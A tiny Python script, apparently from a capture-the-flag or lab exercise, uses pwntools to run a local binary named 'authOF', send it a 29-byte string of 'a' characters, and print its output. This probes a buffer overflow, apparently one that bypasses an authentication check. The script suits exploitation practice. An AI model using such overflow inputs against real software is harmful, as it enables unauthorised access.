from pwn import *

garbage = 'a' * 29
p = process('./authOF')
p.sendline(garbage)
msgout = p.recvall()
print(msgout)
